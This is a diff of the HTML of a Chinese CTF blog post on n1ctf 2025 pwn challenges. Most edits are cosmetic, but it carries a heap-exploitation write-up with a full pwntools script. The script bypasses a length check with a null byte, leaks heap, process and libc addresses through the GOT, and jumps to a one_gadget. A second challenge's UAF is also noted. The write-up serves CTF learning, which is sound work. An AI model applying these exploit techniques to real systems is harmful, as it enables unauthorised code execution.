@@ -6,27 +6,25 @@
   
   <title>n1ctf2025_pwn | xrivendell7&#39;s ctf blog（佩奇小屋）</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="ez_heap保护全开 程序逻辑： 读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：  12xor &#x3D; 0x111111111111111validate &#x3D; b&#x27;admin:&#x27;+p64(xor)+b&#x27;:Junior:111111&#x27;    创建0x180的chunk存放note 结构体每个note大小为0x30，n">
+  <meta name="description" content="ez_heap保护全开 程序逻辑： 读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：  12xor &#x3D; 0x111111111111111validate &#x3D; b&#x27;admin:&#x27;+p64(xor)+b&#x27;:Junior:111111&#x27;  .pmdrbwrmsfog{zoom:67%;}   创建0x180的chunk">
 <meta property="og:type" content="article">
 <meta property="og:title" content="n1ctf2025_pwn">
 <meta property="og:url" content="http://example.com/2025/09/16/n1ctf-pwn/index.html">
 <meta property="og:site_name" content="xrivendell7&#39;s ctf blog（佩奇小屋）">
-<meta property="og:description" content="ez_heap保护全开 程序逻辑： 读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：  12xor &#x3D; 0x111111111111111validate &#x3D; b&#x27;admin:&#x27;+p64(xor)+b&#x27;:Junior:111111&#x27;    创建0x180的chunk存放note 结构体每个note大小为0x30，n">
+<meta property="og:description" content="ez_heap保护全开 程序逻辑： 读入0x30的字符串，进行字符串校验：以冒号为标志split，分成四份。最后输入字符串形如：  12xor &#x3D; 0x111111111111111validate &#x3D; b&#x27;admin:&#x27;+p64(xor)+b&#x27;:Junior:111111&#x27;  .pmdrbwrmsfog{zoom:67%;}   创建0x180的chunk">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/4893f3cf5d0d480a8e32d9a11b2bbc82.png">
-<meta property="og:image" content="http://example.com/290fdb0b196e4d8a891ba30cab77f70e.png">
-<meta property="og:image" content="http://example.com/9b07c2893b9a413eab54aa77cdc96058.png">
+<meta property="og:image" content="http://example.com/2025/09/16/n1ctf-pwn/4893f3cf5d0d480a8e32d9a11b2bbc82.png">
+<meta property="og:image" content="http://example.com/2025/09/16/n1ctf-pwn/290fdb0b196e4d8a891ba30cab77f70e.png">
+<meta property="og:image" content="http://example.com/2025/09/16/n1ctf-pwn/9b07c2893b9a413eab54aa77cdc96058.png">
 <meta property="og:image" content="https://i-blog.csdnimg.cn/direct/bef4e13f101042a9ac378f08379d482c.png">
-<meta property="og:image" content="http://example.com/efc5f43229f54d76933b5a234281a226.png">
+<meta property="og:image" content="http://example.com/2025/09/16/n1ctf-pwn/efc5f43229f54d76933b5a234281a226.png">
 <meta property="og:image" content="http://example.com/f46bbfaa51ec4ba798082ec1cc2ff78b.png">
-<meta property="og:image" content="https://i-blog.csdnimg.cn/direct/3223b369f2604c2c9376f1811e20c019.png">
-<meta property="og:image" content="https://i-blog.csdnimg.cn/direct/925bdfb6e35546b18e779289175c57c3.png">
 <meta property="og:image" content="http://example.com/8a19c192b90d42a38510052ff390ade9.png">
 <meta property="article:published_time" content="2025-09-16T12:33:09.000Z">
-<meta property="article:modified_time" content="2025-11-17T12:36:48.558Z">
+<meta property="article:modified_time" content="2025-11-18T04:02:38.840Z">
 <meta property="article:author" content="xrivendell7">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/4893f3cf5d0d480a8e32d9a11b2bbc82.png">
+<meta name="twitter:image" content="http://example.com/2025/09/16/n1ctf-pwn/4893f3cf5d0d480a8e32d9a11b2bbc82.png">
   
     <link rel="alternate" href="/atom.xml" title="xrivendell7's ctf blog（佩奇小屋）" type="application/atom+xml">
   
@@ -111,9 +109,11 @@
 </ol>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xor = <span class="number">0x111111111111111</span></span><br><span class="line">validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/4893f3cf5d0d480a8e32d9a11b2bbc82.png"></p>
+<style>.pmdrbwrmsfog{zoom:67%;}</style><img src="/2025/09/16/n1ctf-pwn/4893f3cf5d0d480a8e32d9a11b2bbc82.png" class="pmdrbwrmsfog">
+
 <ol start="2">
-<li><p>创建0x180的chunk存放note 结构体每个note大小为0x30，note结构：<br><img src="/290fdb0b196e4d8a891ba30cab77f70e.png"></p>
+<li><p>创建0x180的chunk存放note 结构体每个note大小为0x30，note结构：</p>
+<style>.aawbubrneisb{}</style><img src="/2025/09/16/n1ctf-pwn/290fdb0b196e4d8a891ba30cab77f70e.png" class="aawbubrneisb">
 </li>
 <li><p>add，edit，delete，show操作</p>
 </li>
@@ -121,10 +121,12 @@
 <h2 id="漏洞点："><a href="#漏洞点：" class="headerlink" title="漏洞点："></a>漏洞点：</h2><ol>
 <li><p>editName中strlen可以用\x00绕过造成溢出</p>
 </li>
-<li><p>后门：remove操作中有一个一眼就很可疑的地方：lucky number，<br><img src="/9b07c2893b9a413eab54aa77cdc96058.png" alt="在这里插入图片描述"><br>如果这里的if判断不通过，直接return，看反编译的伪代码不容易看出来，看汇编代码+动态调试可以发现<br>if判断的参数初始值为1，如果执行过一次editName操作以后，这个参数会自减一次，此时remove函数结束时会执行 ret lucyNumber操作<br><img src="https://i-blog.csdnimg.cn/direct/bef4e13f101042a9ac378f08379d482c.png" alt="[图片]"></p>
+<li><p>后门：remove操作中有一个一眼就很可疑的地方：lucky number，</p>
+<style>.sprpykdhhmbm{}</style><img src="/2025/09/16/n1ctf-pwn/9b07c2893b9a413eab54aa77cdc96058.png" class="sprpykdhhmbm" alt="在这里插入图片描述">
+<p>如果这里的if判断不通过，直接return，看反编译的伪代码不容易看出来，看汇编代码+动态调试可以发现<br>if判断的参数初始值为1，如果执行过一次editName操作以后，这个参数会自减一次，此时remove函数结束时会执行 ret lucyNumber操作<br><img src="https://i-blog.csdnimg.cn/direct/bef4e13f101042a9ac378f08379d482c.png" alt="[图片]"></p>
 </li>
-<li><p>这里的xor操作，其中的一个操作数是可控的，dest<br><img src="/efc5f43229f54d76933b5a234281a226.png"></p>
-</li>
+<li><p>这里的xor操作，其中的一个操作数是可控的，dest</p>
+<style>.gxwfszoylvqc{}</style><img src="/2025/09/16/n1ctf-pwn/efc5f43229f54d76933b5a234281a226.png" class="gxwfszoylvqc"></li>
 </ol>
 <p><img src="/f46bbfaa51ec4ba798082ec1cc2ff78b.png"></p>
 <h2 id="难点"><a href="#难点" class="headerlink" title="难点"></a>难点</h2><p>editName操作和show操作只能执行一次<br>利用xor操作构造任意地址读写条件泄露libc地址</p>
@@ -132,8 +134,7 @@
 <p>这时就可以show和修改最后一个struct chunk的data  content chunk的地址（要写入xor后的结果），将其指向got表结合show操作就可以泄露libc、heap、程序地址<br>最后将LUCKYNUMBER设置为onegadget即可</p>
 <h2 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">global</span> binary</span><br><span class="line">    <span class="keyword">global</span> elf</span><br><span class="line">    elf = ELF(binary, checksec=<span class="literal">False</span>)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>, checksec=<span class="literal">False</span>)  </span><br><span class="line">    xor = <span class="number">0x111111111111111</span></span><br><span class="line">    validate = <span class="string">b&#x27;admin:&#x27;</span>+p64(xor)+<span class="string">b&#x27;:Junior:111111&#x27;</span></span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    key_default = <span class="string">b&#x27;1&#x27;</span>*<span class="number">8</span></span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;g&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    remove(key_default,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;8&#x27;</span>,<span class="string">b&#x27;h&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    edit_name(key_default,<span class="number">7</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>))</span><br><span class="line">    show(key_default,<span class="number">7</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    heap_base = ((uu64(r(<span class="number">7</span>))&lt;&lt;<span class="number">8</span>)^xor)&gt;&gt;<span class="number">12</span>&lt;&lt;<span class="number">12</span></span><br><span class="line">    leak(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line">    proc_base = uu64(ru(<span class="string">&#x27;\n&#x27;</span>)) - <span class="number">0x4080</span> - <span class="number">0x7</span>*<span class="number">8</span></span><br><span class="line">    leak(<span class="string">&#x27;proc_base&#x27;</span>,proc_base)</span><br><span class="line">    main_sym = <span class="number">0x1CC7</span></span><br><span class="line">    ret_addr_in_remove = proc_base+main_sym</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(ret_addr_in_remove))</span><br><span class="line">    sla(<span class="string">b&#x27;Do you want to play a game with me?\n&#x27;</span>,validate)</span><br><span class="line">    add(key_default,<span class="string">b&#x27;1&#x27;</span>,<span class="string">b&#x27;48&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    one_gadget_list = [<span class="number">0x583ec</span>,<span class="number">0x583f3</span>,<span class="number">0xef4ce</span>,<span class="number">0xef52b</span>]</span><br><span class="line">    one_gadget = one_gadget_list[<span class="number">3</span>]</span><br><span class="line">    edit_name(key_default,<span class="number">0</span>,<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xf</span>)+p64((proc_base+elf.got[<span class="string">&#x27;free&#x27;</span>])^xor))</span><br><span class="line">    show(key_default,<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">    free_addr = uu64(ru(<span class="string">&#x27;\n&#x27;</span>))</span><br><span class="line">    libc.address = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">    remove(key_default,<span class="number">1</span>,<span class="built_in">str</span>(libc.address+one_gadget))</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure>
 
-<h1 id="近队容器的礼仪"><a href="#近队容器的礼仪" class="headerlink" title="近队容器的礼仪"></a>近队容器的礼仪</h1><p>叽里咕噜的说什么呢，看不懂<br><img src="https://i-blog.csdnimg.cn/direct/3223b369f2604c2c9376f1811e20c019.png" alt="[图片]"></p>
-<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>附件给出了pwn文件和libc文件夹，将libc.so.6和ld文件从libc文件夹中剪切出来，注意是剪切，确保libc文件夹中不再存在这两个文件，<br>直接运行使用：</p>
+<h1 id="近队容器的礼仪"><a href="#近队容器的礼仪" class="headerlink" title="近队容器的礼仪"></a>近队容器的礼仪</h1><h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><p>附件给出了pwn文件和libc文件夹，将libc.so.6和ld文件从libc文件夹中剪切出来，注意是剪切，确保libc文件夹中不再存在这两个文件，<br>直接运行使用：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter  ./ld-linux-x86-64.so.2 pwn</span><br><span class="line">patchelf --replace-needed libc.so.6  ./libc.so.6 pwn</span><br><span class="line">LD_LIBRARY_PATH=./libc pwn</span><br></pre></td></tr></table></figure>
 
 <p>python中pwnlib调用：</p>
@@ -141,7 +142,7 @@
 
 <h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">b&#x27;1. Exit\n&#x27;</span><br><span class="line">b&#x27;2. Add deque to vector\n&#x27;</span><br><span class="line">b&#x27;3. Create Animal in deque\n&#x27;</span><br><span class="line">b&#x27;4. Remove deque from vector\n&#x27;</span><br><span class="line">b&#x27;5. Remove Animal from deque\n&#x27;</span><br><span class="line">b&#x27;6. Edit Animal in deque\n&#x27;</span><br><span class="line">b&#x27;7. Print Animal in deque\n&#x27;</span><br><span class="line">b&#x27;12. Create Animal in vector\n&#x27;</span><br><span class="line">b&#x27;13. Remove Animal from vector\n&#x27;</span><br><span class="line">b&#x27;14. Edit Animal in vector\n&#x27;</span><br><span class="line">b&#x27;15. Print Animal in vector\n&#x27;</span><br><span class="line">b&#x27;Enter your choice: &#x27;</span><br></pre></td></tr></table></figure>
 
-<p>IDA的结果看起来太复杂了，先直接进行几次操作看看<br><img src="https://i-blog.csdnimg.cn/direct/925bdfb6e35546b18e779289175c57c3.png" alt="[图片]"></p>
+<p>IDA的结果看起来太复杂了，先直接进行几次操作看看</p>
 <p>先尝试下有没有UAF<br>结果一试还真有</p>
 <h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><ol>
 <li>刚刚提到的UAF，可以通过unsorted bin fd泄露libc和tcache bin fd泄露heap基址</li>
@@ -200,7 +201,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">January 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">December 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/11/">November 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/10/">October 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/09/">September 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2025/08/">August 2025</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/11/">November 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/11/">November 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">April 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">November 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li></ul>
     </div>
   </div>
 
@@ -225,7 +226,7 @@
           </li>
         
           <li>
-            <a href="/2025/10/17/train0927/">train0927</a>
+            <a href="/2025/10/18/train0927/">train0927</a>
           </li>
         
           <li>
